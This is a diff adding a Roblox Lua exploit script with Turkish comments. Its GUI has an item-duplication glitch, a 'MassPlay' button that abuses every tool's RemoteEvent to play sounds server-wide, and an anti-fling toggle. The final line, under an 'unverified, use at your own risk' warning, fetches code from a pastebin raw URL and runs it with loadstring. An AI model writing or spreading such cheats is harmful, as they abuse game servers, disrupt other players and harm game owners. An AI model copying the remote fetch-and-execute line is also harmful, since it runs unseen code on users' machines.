@@ -1,0 +1,346 @@
+local player = game:GetService("Players").LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "AdvancedToolGUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Tema
+local theme = {
+    background = Color3.fromRGB(35, 0, 0),
+    accent = Color3.fromRGB(255, 200, 0),
+    text = Color3.fromRGB(255, 255, 255)
+}
+
+-- Açılma sesi
+local openSound = Instance.new("Sound", gui)
+openSound.SoundId = "rbxassetid://9118823101" -- örnek bir UI tık sesi
+openSound.Volume = 1
+
+-- GUI Toggle Butonu (Sol Orta)
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 60, 0, 30)
+toggleBtn.Position = UDim2.new(0, 10, 0.5, -15)
+toggleBtn.Text = "X"
+toggleBtn.BackgroundColor3 = theme.accent
+toggleBtn.TextColor3 = theme.text
+toggleBtn.TextScaled = true
+toggleBtn.Font = Enum.Font.SourceSansBold
+toggleBtn.Parent = gui
+
+-- Ana Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 320, 0, 260)
+frame.Position = UDim2.new(0.5, -160, 0.5, -130)
+frame.BackgroundColor3 = theme.background
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Visible = false
+frame.BackgroundTransparency = 1
+frame.Parent = gui
+
+-- Aç/Kapat fonksiyonu
+local function toggleFrame()
+    if frame.Visible then
+        frame.Visible = false
+    else
+        frame.Visible = true
+        frame.BackgroundTransparency = 1
+        openSound:Play()
+        for i = 1, 10 do
+            frame.BackgroundTransparency = 1 - (i * 0.1)
+            task.wait(0.02)
+        end
+    end
+end
+toggleBtn.MouseButton1Click:Connect(toggleFrame)
+
+-- Kapatma Tuşu (Sağ üstte)
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 25, 0, 25)
+closeBtn.Position = UDim2.new(1, -30, 0, 5)
+closeBtn.Text = "✖"
+closeBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+closeBtn.TextColor3 = theme.text
+closeBtn.TextScaled = true
+closeBtn.Font = Enum.Font.SourceSansBold
+closeBtn.Parent = frame
+closeBtn.MouseButton1Click:Connect(function()
+    frame.Visible = false
+end)
+
+-- Sekmeler
+local tabs = {"Dupe", "MassPlay"}
+local tabFrames = {}
+
+for i, name in ipairs(tabs) do
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 160, 0, 30)
+    button.Position = UDim2.new(0, (i - 1) * 160, 0, 0)
+    button.Text = name
+    button.BackgroundColor3 = theme.accent
+    button.TextColor3 = theme.text
+    button.TextScaled = true
+    button.Font = Enum.Font.SourceSansBold
+    button.Parent = frame
+
+    local subFrame = Instance.new("Frame")
+    subFrame.Size = UDim2.new(1, 0, 1, -30)
+    subFrame.Position = UDim2.new(0, 0, 0, 30)
+    subFrame.BackgroundTransparency = 1
+    subFrame.Visible = (i == 1)
+    subFrame.Parent = frame
+    tabFrames[name] = subFrame
+
+    button.MouseButton1Click:Connect(function()
+        for _, f in pairs(tabFrames) do f.Visible = false end
+        subFrame.Visible = true
+    end)
+end
+
+-------------------------------------
+-- 📦 DUPE
+-------------------------------------
+local dupeFrame = tabFrames["Dupe"]
+
+local amountBox = Instance.new("TextBox", dupeFrame)
+amountBox.PlaceholderText = "Dupe Sayısı"
+amountBox.Size = UDim2.new(0, 260, 0, 35)
+amountBox.Position = UDim2.new(0, 30, 0, 10)
+amountBox.TextScaled = true
+amountBox.Font = Enum.Font.SourceSans
+amountBox.BackgroundColor3 = theme.background
+amountBox.TextColor3 = theme.text
+
+local dupeButton = Instance.new("TextButton", dupeFrame)
+dupeButton.Text = "Başla"
+dupeButton.Size = UDim2.new(0, 260, 0, 40)
+dupeButton.Position = UDim2.new(0, 30, 0, 55)
+dupeButton.TextScaled = true
+dupeButton.Font = Enum.Font.SourceSansBold
+dupeButton.BackgroundColor3 = theme.accent
+dupeButton.TextColor3 = theme.text
+
+local infoLabel = Instance.new("TextLabel", dupeFrame)
+infoLabel.Size = UDim2.new(1, 0, 0, 30)
+infoLabel.Position = UDim2.new(0, 0, 1, -30)
+infoLabel.BackgroundTransparency = 1
+infoLabel.TextColor3 = theme.text
+infoLabel.TextScaled = true
+infoLabel.Font = Enum.Font.SourceSansBold
+infoLabel.Text = ""
+
+dupeButton.MouseButton1Click:Connect(function()
+	local amount = tonumber(amountBox.Text)
+	if not amount or amount <= 0 then
+		infoLabel.Text = "Geçerli bir sayı gir."
+		return
+	end
+
+	local plr = player
+	local character = plr.Character
+	if not character or not character:FindFirstChild("HumanoidRootPart") then
+		infoLabel.Text = "Karakter bulunamadı."
+		return
+	end
+
+	infoLabel.Text = "Duplama başlatıldı..."
+	local ogpos = character.HumanoidRootPart.Position
+
+	for i = 1, amount do
+		infoLabel.Text = " " .. i .. "/" .. amount
+		character:WaitForChild("HumanoidRootPart")
+
+		for _, tool in pairs(plr.Backpack:GetChildren()) do
+			if tool:IsA("Tool") then tool.Parent = character end
+		end
+		for _, tool in pairs(character:GetChildren()) do
+			if tool:IsA("Tool") then tool.Parent = character end
+		end
+
+		character.HumanoidRootPart.CFrame = CFrame.new(0, 10000, 0)
+
+		local timeout = 3
+		local start = tick()
+		repeat task.wait() until not plr.Backpack:FindFirstChildOfClass("Tool") or tick() - start > timeout
+		task.wait(0.75)
+
+		for _, v in pairs(character:GetChildren()) do
+			if v:IsA("BasePart") then
+				v.CanCollide = false
+				v.Anchored = true
+			end
+		end
+
+		for _, tool in pairs(character:GetChildren()) do
+			if tool:IsA("Tool") then
+				tool.Parent = workspace
+			end
+		end
+
+		character:BreakJoints()
+		plr.CharacterAdded:Wait()
+		character = plr.Character
+	end
+
+	character:WaitForChild("HumanoidRootPart")
+	task.wait(0.15)
+	character.HumanoidRootPart.CFrame = CFrame.new(ogpos)
+
+	for _, tool in pairs(workspace:GetChildren()) do
+		if tool:IsA("Tool") then
+			character.Humanoid:EquipTool(tool)
+		end
+	end
+
+	infoLabel.Text = "Dup Done"
+end)
+
+-------------------------------------
+-- 🔊 MASS PLAY
+-------------------------------------
+-------------------------------------
+-- 🔊 MASS PLAY (Temizlenmiş)
+-------------------------------------
+local massFrame = tabFrames["MassPlay"]
+
+local idBox = Instance.new("TextBox", massFrame)
+idBox.PlaceholderText = "Ses ID'si"
+idBox.Size = UDim2.new(0, 260, 0, 35)
+idBox.Position = UDim2.new(0, 30, 0, 20)
+idBox.TextScaled = true
+idBox.Font = Enum.Font.SourceSans
+idBox.BackgroundColor3 = theme.background
+idBox.TextColor3 = theme.text
+idBox.Text = ""
+
+local playButton = Instance.new("TextButton", massFrame)
+playButton.Text = "Mass-Play"
+playButton.Size = UDim2.new(0, 260, 0, 40)
+playButton.Position = UDim2.new(0, 30, 0, 65)
+playButton.TextScaled = true
+playButton.Font = Enum.Font.SourceSansBold
+playButton.BackgroundColor3 = theme.accent
+playButton.TextColor3 = theme.text
+playButton.Parent = massFrame
+
+playButton.MouseButton1Click:Connect(function()
+    local id = tonumber(idBox.Text)
+    if not id then return end
+
+    -- Tüm tool'ları karaktere al
+    for _, tool in pairs(player.Backpack:GetChildren()) do
+        if tool:IsA("Tool") and tool:FindFirstChildWhichIsA("RemoteEvent", true) then
+            tool.Parent = player.Character
+        end
+    end
+    for _, tool in pairs(player.Character:GetChildren()) do
+        local remote = tool:FindFirstChildWhichIsA("RemoteEvent", true)
+        if remote then
+            pcall(function()
+                remote:FireServer("PlaySong", id)
+            end)
+        end
+    end
+end)
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+
+-- AntiFling kısmı
+local HeartbeatLoops = {}
+local AntiFlingEnabled = false
+
+local function startAntiFling()
+    AntiFlingEnabled = true
+    -- Önce varsa bağlantıları kes
+    for _, conn in pairs(HeartbeatLoops) do
+        if conn and conn.Connected then
+            conn:Disconnect()
+        end
+    end
+    HeartbeatLoops = {}
+
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("Part") and v.Name == "HumanoidRootPart" and v.Parent ~= Client.Character and v.Anchored == false then
+            local conn
+            conn = RunService.Heartbeat:Connect(function()
+                if not AntiFlingEnabled then
+                    if conn then conn:Disconnect() end
+                    return
+                end
+                if v and v.Parent then
+                    v.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
+                    v.Velocity = Vector3.new(0,0,0)
+                    v.RotVelocity = Vector3.new(0,0,0)
+                    v.CanCollide = false
+                else
+                    if conn then conn:Disconnect() end
+                end
+            end)
+            table.insert(HeartbeatLoops, conn)
+        end
+    end
+end
+
+local function stopAntiFling()
+    AntiFlingEnabled = false
+    for _, conn in pairs(HeartbeatLoops) do
+        if conn and conn.Connected then
+            conn:Disconnect()
+        end
+    end
+    HeartbeatLoops = {}
+end
+
+-- GUI oluşturma
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AntiFlingToggleGui"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = Client:WaitForChild("PlayerGui")
+
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Size = UDim2.new(0,150,0,50)
+ToggleButton.Position = UDim2.new(0, 20, 0, 20)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(255,0,0)
+ToggleButton.TextColor3 = Color3.fromRGB(255,255,255)
+ToggleButton.Font = Enum.Font.SourceSansBold
+ToggleButton.TextSize = 20
+ToggleButton.Text = "AntiFling OFF"
+ToggleButton.Parent = ScreenGui
+
+ToggleButton.MouseButton1Click:Connect(function()
+    if AntiFlingEnabled then
+        stopAntiFling()
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(255,0,0)
+        ToggleButton.Text = "AntiFling OFF"
+    else
+        startAntiFling()
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(0,200,0)
+        ToggleButton.Text = "AntiFling ON"
+    end
+end)
+
+-- Oyuna yeni parçalar eklendiğinde güncelle
+workspace.DescendantAdded:Connect(function(part)
+    if AntiFlingEnabled and part:IsA("Part") and part.Name == "HumanoidRootPart" and part.Parent ~= Client.Character then
+        wait(2)
+        startAntiFling()
+    end
+end)
+
+-- Karakter öldüğünde kapat
+if Client.Character and Client.Character:FindFirstChild("Humanoid") then
+    Client.Character.Humanoid.Died:Connect(function()
+        stopAntiFling()
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(255,0,0)
+        ToggleButton.Text = "AntiFling OFF"
+    end)
+end
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://pastebin.com/raw/LgZwZ7ZB",true))()
